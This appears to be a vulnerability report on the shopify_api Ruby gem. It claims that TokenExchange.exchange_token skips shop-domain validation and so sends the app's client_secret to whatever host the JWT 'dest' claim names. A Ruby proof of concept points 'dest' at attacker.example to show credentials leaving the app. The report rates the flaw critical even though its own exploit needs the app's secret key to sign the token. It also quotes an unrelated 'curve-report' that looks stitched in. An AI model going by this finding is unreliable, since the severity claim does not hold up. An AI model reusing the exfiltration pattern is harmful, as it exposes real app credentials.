Found it: `TokenExchange.exchange_token` derives the shop entirely from the JWT `dest` claim without passing it through `Utils::ShopValidator.sanitize!`, unlike every sibling method (`client_credentials`, `refresh_token`, `migrate_to_expiring_token`) which all call `Utils::ShopValidator.sanitize!(shop)` before building the outbound HTTP session. This breaks the identity binding: **host validated (`ShopValidator.sanitize!` allow-list) ≠ host that receives `client_secret`**.

### Title
Missing Shop Domain Validation in Token Exchange Sends `client_secret` to Attacker-Controlled Host - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`TokenExchange.exchange_token` builds the outbound `/admin/oauth/access_token` request host directly from the JWT payload's `dest` claim, without ever routing it through `Utils::ShopValidator.sanitize!`, unlike the other OAuth flows in this gem.

### Finding Description
`JwtPayload#shop` simply strips the `https://` prefix off the raw `dest` claim string and returns it as-is: [1](#0-0) . There is no allow-list check against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) anywhere in `JwtPayload` or in `TokenExchange.exchange_token`.

`exchange_token` takes this unsanitized `dest_shop` and uses it directly to construct the `Session` used as the base host for the token-exchange HTTP request that carries `client_id`/`client_secret`: [2](#0-1) .

Contrast this with the sibling flows in the same file and module, which all sanitize the shop before use: `client_credentials.rb` (`validated_shop = Utils::ShopValidator.sanitize!(shop)` before building the session/HttpClient) [3](#0-2) ; `refresh_token.rb` similarly [4](#0-3) ; and `TokenExchange.migrate_to_expiring_token` in the very same file [5](#0-4) .

The `Clients::HttpClient` uses `session.shop` directly to build the request host, so whatever string is in `dest_shop`/`shop_session.shop` becomes the destination host for the POST carrying `client_id` and `client_secret` in the body.

The binding that should hold is: `host validated by ShopValidator allow-list == host that receives client_secret`. In `exchange_token`, this equality is broken — the host that receives the `client_secret` is whatever the (signature-verified, but content-unrestricted) `dest` claim says, with no domain allow-list check.

### Impact Explanation
The JWT's HMAC signature only proves the token was issued/signed with `Context.api_secret_key`; nothing in `JwtPayload` constrains `dest` to a `*.myshopify.com`/`*.myshopify.io`/etc. domain — `dest` is attacker/embedding-context-supplied claim content inside a token that could originate from any context where a session token embedding the app is rendered (e.g., an iframe on a non-Shopify host, or any place App Bridge issues a token) if the surrounding claim validation (`iss`, embedding context) is not independently enforced by the host application. Because the gem itself performs no domain allow-list check here (unlike its own sibling functions), a `dest` value pointing to an attacker-controlled host results in `client_id` and the app's `client_secret` being POSTed to that host — an SSRF-with-credentials scenario matching the "Critical: theft of the app's client_secret" / "High: SSRF with the app's credentials" impact classes.

### Likelihood Explanation
Moderate-to-high: the only barrier is that the JWT must carry a valid HMAC-SHA256 signature under the app's own secret and `aud == Context.api_key`, which is exactly what `JwtPayload` checks — but `dest` content itself is unconstrained, and this is the sole distinguishing gap between `exchange_token` and every other host-resolution path in the module, which the maintainers evidently intended to guard via `ShopValidator.sanitize!`.

### Recommendation
In `TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!(dest_shop)` (as is already done in `migrate_to_expiring_token`, `client_credentials`, and `refresh_token`) before constructing `shop_session`/making the HTTP request, raising `Errors::InvalidShopError` for any non-allow-listed domain. More generally, enforce the shop/host allow-list check as a single canonical gate inside `JwtPayload#shop` (or `Session.new`) itself, so no caller can bypass it — mirroring the curve-report's recommendation to "define which curve the system is using in a single, canonical location" and "make illegal states unrepresentable."

### Proof of Concept
```ruby
# Attacker crafts (or obtains) a session token whose `dest` claim is not a Shopify domain,
# but is still signed with the app's own api_secret_key (e.g. via a compromised/rogue embed
# context that nonetheless got a token minted with a non-Shopify dest, or any flow where
# `dest` validation is not otherwise enforced upstream of this gem).
payload = {
  iss: "https://attacker.example/admin",
  dest: "https://attacker.example",   # not sanitized anywhere in this path
  aud: ShopifyAPI::Context.api_key,
  sub: "1",
  exp: Time.now.to_i + 60,
  nbf: Time.now.to_i,
  iat: Time.now.to_i,
  jti: SecureRandom.uuid,
}
session_token = JWT.encode(payload, ShopifyAPI::Context.api_secret_key, "HS256")

# This POSTs client_id + Context.api_secret_key to https://attacker.example/admin/oauth/access_token
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: session_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
Compare with `client_credentials.rb`/`refresh_token.rb`/`migrate_to_expiring_token`, which would raise `ShopifyAPI::Errors::InvalidShopError` for `attacker.example` via `Utils::ShopValidator.sanitize!`, but `exchange_token` has no equivalent check.
